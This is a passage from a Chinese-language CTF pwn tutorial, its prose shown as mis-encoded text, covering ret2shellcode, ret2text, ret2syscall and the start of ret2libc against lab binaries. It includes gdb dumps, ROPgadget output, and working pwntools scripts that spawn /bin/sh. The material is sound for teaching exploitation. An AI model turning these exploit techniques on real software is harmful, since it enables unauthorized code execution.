<h2 id="æŸ¥çœ‹å±é™©å‡½æ•°"><a href="#æŸ¥çœ‹å±é™©å‡½æ•°" class="headerlink" title="æŸ¥çœ‹å±é™©å‡½æ•°"></a>æŸ¥çœ‹å±é™©å‡½æ•°</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+1Ch] [bp-64h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No system for you this time !!!&quot;);</span><br><span class="line">  gets((char *)&amp;v4);</span><br><span class="line">  strncpy(buf2, (const char *)&amp;v4, 0x64u);</span><br><span class="line">  printf(&quot;bye bye ~&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæ¼æ´å‡½æ•°ä¾ç„¶è¿˜æ˜¯getsï¼Œä¸è¿‡è¿™æ¬¡è¿˜æŠŠv4å¤åˆ¶åˆ°äº†buf2å¤„ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure></p>
<p>é€šè¿‡<code>sudo cat /proc/[pid]/maps</code>æŸ¥çœ‹,ä¼šå‘ç°buf2å’Œstackéƒ½æ˜¯rwxçš„ã€‚</p>
<h2 id="è®¡ç®—æº¢å‡ºç‚¹"><a href="#è®¡ç®—æº¢å‡ºç‚¹" class="headerlink" title="è®¡ç®—æº¢å‡ºç‚¹"></a>è®¡ç®—æº¢å‡ºç‚¹</h2><p>å¯ä»¥çœ‹åˆ°è¯¥å­—ç¬¦ä¸²æ˜¯é€šè¿‡ç›¸å¯¹äº esp çš„ç´¢å¼•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œè°ƒè¯•ï¼Œå°†æ–­ç‚¹ä¸‹åœ¨ call getså¤„ï¼ŒæŸ¥çœ‹ espï¼Œebp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34</span><br><span class="line">EBX: 0x0</span><br><span class="line">ECX: 0xf7fb2dc7 --&gt; 0xfb38900a</span><br><span class="line">EDX: 0xf7fb3890 --&gt; 0x0</span><br><span class="line">ESI: 0xf7fb2000 --&gt; 0x1d4d6c</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffca08 --&gt; 0x0</span><br><span class="line">ESP: 0xffffc980 --&gt; 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34</span><br><span class="line">EIP: 0x8048593 (&lt;main+102&gt;:	call   0x80483d0 &lt;gets@plt&gt;)</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048587 &lt;main+90&gt;:	call   0x80483e0 &lt;puts@plt&gt;</span><br><span class="line">   0x804858c &lt;main+95&gt;:	lea    eax,[esp+0x1c]</span><br><span class="line">   0x8048590 &lt;main+99&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">=&gt; 0x8048593 &lt;main+102&gt;:	call   0x80483d0 &lt;gets@plt&gt;</span><br><span class="line">   0x8048598 &lt;main+107&gt;:	mov    DWORD PTR [esp+0x8],0x64</span><br><span class="line">   0x80485a0 &lt;main+115&gt;:	lea    eax,[esp+0x1c]</span><br><span class="line">   0x80485a4 &lt;main+119&gt;:	mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x80485a8 &lt;main+123&gt;:	mov    DWORD PTR [esp],0x804a080</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffc980 --&gt; 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34</span><br><span class="line">0004| 0xffffc984 --&gt; 0x0</span><br><span class="line">0008| 0xffffc988 --&gt; 0x1</span><br><span class="line">0012| 0xffffc98c --&gt; 0x0</span><br><span class="line">0016| 0xffffc990 --&gt; 0x0</span><br><span class="line">0020| 0xffffc994 --&gt; 0xc30000</span><br><span class="line">0024| 0xffffc998 --&gt; 0x0</span><br><span class="line">0028| 0xffffc99c --&gt; 0xf7ffd000 --&gt; 0x26f34</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048593 in main () at ret2shellcode.c:14</span><br><span class="line">14	ret2shellcode.c: No such file or directory.</span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ° esp ä¸º 0xffffc980ï¼Œebp ä¸º0xffffca08ï¼ŒåŒæ—¶ v4 ç›¸å¯¹äº esp çš„ç´¢å¼•ä¸º [esp+0x1c]ï¼Œæ‰€ä»¥ï¼Œv4 çš„åœ°å€ä¸º 0xffffc99cï¼Œæ‰€ä»¥ s ç›¸å¯¹äº ebp çš„åç§»ä¸º 0x6Cï¼Œæ‰€ä»¥ç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»ä¸º 0x6c+4ã€‚</p>
<h2 id="åŠ«æŒretçš„åœ°å€-1"><a href="#åŠ«æŒretçš„åœ°å€-1" class="headerlink" title="åŠ«æŒretçš„åœ°å€"></a>åŠ«æŒretçš„åœ°å€</h2><p>è¿™æ¬¡æˆ‘ä»¬æƒ³è¦ç¨‹åºæ‰§è¡Œshellcodeï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠshellcodeæ”¾åœ¨ä»»ä½•å¯æ‰§è¡Œçš„ä½ç½®ï¼Œæ¯”å¦‚buf2æˆ–æ ˆä¸Šï¼Œä½ç½®çš„åœ°å€å°±æ˜¯æˆ‘ä»¬éœ€è¦è¦†ç›–ret_addrçš„å€¼</p>
<h2 id="pwnæµ‹è¯•-1"><a href="#pwnæµ‹è¯•-1" class="headerlink" title="pwnæµ‹è¯•"></a>pwnæµ‹è¯•</h2><p>æ§åˆ¶ç¨‹åºæ‰§è¡Œbssæ®µçš„shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./ret2shellcode&apos;)</span><br><span class="line"></span><br><span class="line">ret_addr = 0x0804A080</span><br><span class="line">offset = 0x6c + 4</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line">payload = shellcode.ljust(offset,&apos;a&apos;) + p32(ret_addr)</span><br><span class="line">#payload = shellcode + &apos;a&apos;*(offset - len(shellcode)) + p32(ret_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<blockquote>
<ol>
<li><p>Shellcodeç”Ÿæˆå™¨<br>ä½¿ç”¨shellcraftå¯ä»¥ç”Ÿæˆå¯¹åº”çš„æ¶æ„çš„shellcodeä»£ç ï¼Œç›´æ¥ä½¿ç”¨é“¾å¼è°ƒç”¨çš„æ–¹æ³•å°±å¯ä»¥å¾—åˆ°<br>å¦‚32ä½linuxï¼šshellcraft.i386.linux.sh()<br>shellcode.ljust(offset,â€™aâ€™)åœ¨shellcodeåé¢å¡«å……offset - len(shellcode)é•¿åº¦çš„å­—ç¬¦â€˜aâ€™</p>
</li>
<li><p>æ±‡ç¼–ä¸åæ±‡ç¼–<br>ä½¿ç”¨asmæ¥è¿›è¡Œæ±‡ç¼–ï¼Œä½¿ç”¨disasmè¿›è¡Œåæ±‡ç¼–<br>æŒ‡å®šcpuç±»å‹ä»¥åŠæ“ä½œç³»ç»Ÿï¼šasm(â€˜nopâ€™, arch=â€™armâ€™ï¼Œos = â€˜linuxâ€™ï¼Œendian = â€˜littleâ€™ï¼Œword_size = 32)</p>
</li>
</ol>
</blockquote>
<hr>
<h1 id="0x02-ret2text"><a href="#0x02-ret2text" class="headerlink" title="0x02 ret2text"></a>0x02 ret2text</h1><h2 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)ã€‚å…¶å®ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•æ˜¯ä¸€ç§ç¬¼ç»Ÿçš„æè¿°ã€‚æˆ‘ä»¬æ§åˆ¶æ‰§è¡Œç¨‹åºå·²æœ‰çš„ä»£ç çš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„ç¨‹åºå·²æœ‰çš„ä»£ç  (ä¹Ÿå°±æ˜¯ gadgets)ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¦è¯´çš„ ROPã€‚</p>
<p>ROPä¸éœ€è¦å»æ‰§è¡Œæ ˆä¸­çš„shellcodeï¼Œå› æ­¤å¯ä»¥ç»•è¿‡DEPä¿æŠ¤</p>
<h2 id="æ£€æŸ¥ä¿æŠ¤"><a href="#æ£€æŸ¥ä¿æŠ¤" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤"></a>æ£€æŸ¥ä¿æŠ¤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ret2text</span><br><span class="line">[*] &apos;/home/han/ck/pwn/linux/ret2text/ret2text&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>å¼€å¯äº†DEPï¼Œé—®é¢˜ä¸å¤§ï¼Œå› ä¸ºæ‰§è¡Œçš„å·²æœ‰çš„ä»£ç </p>
<h2 id="æ£€æŸ¥å±é™©å‡½æ•°"><a href="#æ£€æŸ¥å±é™©å‡½æ•°" class="headerlink" title="æ£€æŸ¥å±é™©å‡½æ•°"></a>æ£€æŸ¥å±é™©å‡½æ•°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"There is something amazing here, do you know anything?"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åŒæ ·è¿˜æ˜¯getså‡½æ•°</p>
<h2 id="è®¡ç®—åç§»"><a href="#è®¡ç®—åç§»" class="headerlink" title="è®¡ç®—åç§»"></a>è®¡ç®—åç§»</h2><p>å’Œä¸Šä¸€ä¸ªä¸€æ ·ï¼Œ0x6c+4</p>
<h2 id="å¯»æ‰¾è·³æ¿"><a href="#å¯»æ‰¾è·³æ¿" class="headerlink" title="å¯»æ‰¾è·³æ¿"></a>å¯»æ‰¾è·³æ¿</h2><p>åœ¨ä»£ç æ®µå‘ç°è°ƒç”¨ system(â€œ/bin/shâ€) çš„ä»£ç ï¼Œé‚£ä¹ˆç›´æ¥å°†retè¦†ç›–ä¸º0804863Aå°±èƒ½æ‹¿åˆ°shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:0804862D                 call    ___isoc99_scanf</span><br><span class="line">.text:08048632                 mov     eax, [ebp+input]</span><br><span class="line">.text:08048635                 cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:08048638                 jnz     short locret_8048646</span><br><span class="line">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:08048641                 call    _system</span><br><span class="line">.text:08048646</span><br></pre></td></tr></table></figure></p>
<h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./ret2text&apos;)</span><br><span class="line">ret_add = 0x0804863A</span><br><span class="line">offset = 0x6c + 4</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos;*offset + p32(ret_add)</span><br><span class="line">print(p32(ret_add))</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="0x03-ret2syscall"><a href="#0x03-ret2syscall" class="headerlink" title="0x03 ret2syscall"></a>0x03 ret2syscall</h1><h2 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>ret2syscallï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shellã€‚ä¸Šä¸€ä¸ªå¯ä»¥åœ¨ä»£ç æ®µæ‰¾åˆ°system(â€˜/bin/shâ€™),<br>å¦‚æœæ²¡æ³•æ‰¾åˆ°çš„è¯ï¼Œæˆ‘ä»¬å°±å¾—è‡ªå·±å»æ„é€ ç³»ç»Ÿè°ƒç”¨<br>ç®€å•åœ°è¯´ï¼Œåªè¦æˆ‘ä»¬æŠŠå¯¹åº”è·å– shell çš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ”¾åˆ°å¯¹åº”çš„å¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨æ‰§è¡Œ int 0x80 å°±å¯æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚æ¯”å¦‚è¯´è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨å¦‚ä¸‹ç³»ç»Ÿè°ƒç”¨æ¥è·å– shell<br><code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code><br>å…¶ä¸­ï¼Œè¯¥ç¨‹åºæ˜¯ 32 ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿å¾—<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º 0xb</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ /bin/sh çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚</span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx åº”è¯¥ä¸º 0</span><br><span class="line">ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º 0</span><br></pre></td></tr></table></figure></p>
<h2 id="è·å–è·³æ¿"><a href="#è·å–è·³æ¿" class="headerlink" title="è·å–è·³æ¿"></a>è·å–è·³æ¿</h2><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å»æ§åˆ¶è¿™4ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œæˆ‘ä»¬ç°åœ¨ä¿®æ”¹çš„åªæœ‰æ ˆä¸­çš„æ•°æ®ï¼Œè¿™é‡Œå°±éœ€è¦ä½¿ç”¨ gadgetsã€‚æ¯”å¦‚è¯´ï¼Œç°åœ¨æ ˆé¡¶æ˜¯ 10ï¼Œé‚£ä¹ˆå¦‚æœæ­¤æ—¶æ‰§è¡Œäº† pop eaxï¼Œé‚£ä¹ˆç°åœ¨ eax çš„å€¼å°±ä¸º 10ã€‚ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½æœŸå¾…æœ‰ä¸€æ®µè¿ç»­çš„ä»£ç å¯ä»¥åŒæ—¶æ§åˆ¶å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€æ®µä¸€æ®µæ§åˆ¶ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åœ¨ gadgets æœ€åä½¿ç”¨ ret æ¥å†æ¬¡æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹çš„åŸå› ã€‚å…·ä½“å¯»æ‰¾ gadgets çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ropgadgets è¿™ä¸ªå·¥å…·ã€‚<br>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥å¯»æ‰¾æ§åˆ¶ eax çš„ gadgets<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall --only &apos;pop|ret&apos;|grep eax</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure></p>
<p>ç±»ä¼¼çš„ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°æ§åˆ¶å…¶å®ƒå¯„å­˜å™¨çš„ gadgets<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall --only &apos;pop|ret&apos;|grep ebx</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure></p>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†å¯ä»¥æ§åˆ¶4ä¸ªå¯„å­˜å™¨çš„åœ°å€ï¼š<br><code>0x080bb196 : pop eax ; ret</code><br><code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code></p>
<p>å¦å¤–ï¼Œæˆ‘ä»¬è¦å‘ebxå†™å…¥â€™/bin/shâ€™ï¼ŒåŒæ—¶æ‰§è¡Œint 80<br>æ‰€ä»¥è¦æœç´¢ï¼Œçœ‹çœ‹ç¨‹åºä¸­æœ‰æ²¡æœ‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall --only int</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall --string &apos;/bin/sh&apos;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be42c : /bin/sh</span><br></pre></td></tr></table></figure>
<h2 id="æµ‹è¯•-1"><a href="#æµ‹è¯•-1" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ret2syscall'</span>)</span><br><span class="line">offset = <span class="number">0x6c</span> + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*offset + p32(pop_eax_ret) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(binsh) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">'A'</span>*offset , pop_eax_ret , <span class="number">0xb</span> , pop_edx_ecx_ebx_ret , <span class="number">0</span> , <span class="number">0</span> , binsh,int_0x80)</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<ol>
<li>flat()<br>åœ¨pwntoolsä¸­å¯ä»¥ç”¨flat()ä¾†æ„é€ ropï¼Œå‚æ•°ä¼ é€’ç”¨listä¾†ä¼ ï¼Œlistä¸­çš„elementä¸ºæƒ³ä¸²æ¥çš„rop gadgetåœ°å€ï¼Œç®€å•æ¥è¯´å°±æ˜¯å¯ä»¥æŠŠï¼šrop = p32(gadget1) + p32(gadget2) + p32(gadget3) â€¦â€¦å˜æˆè¿™æ ·è¡¨ç¤ºï¼šflat([gadget1,gadget2,gadget3,â€¦â€¦])</li>
</ol>
</blockquote>
<hr>
<h1 id="0x04-ret2libc"><a href="#0x04-ret2libc" class="headerlink" title="0x04 ret2libc"></a>0x04 ret2libc</h1><h2 id="åŸç†-3"><a href="#åŸç†-3" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æˆ‘ä»¬çŸ¥é“ç¨‹åºè°ƒç”¨äº†libc.soï¼Œå¹¶ä¸”libc.soé‡Œä¿å­˜äº†å¤§é‡å¯åˆ©ç”¨çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¦‚æœå¯ä»¥è®©ç¨‹åºæ‰§è¡Œsystem(â€œ/bin/shâ€)çš„è¯ï¼Œä¹Ÿå¯ä»¥è·å–åˆ°shellã€‚æ—¢ç„¶æ€è·¯æœ‰äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯å¦‚ä½•å¾—åˆ°system()è¿™ä¸ªå‡½æ•°çš„åœ°å€ä»¥åŠâ€/bin/shâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„åœ°å€ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)</p>
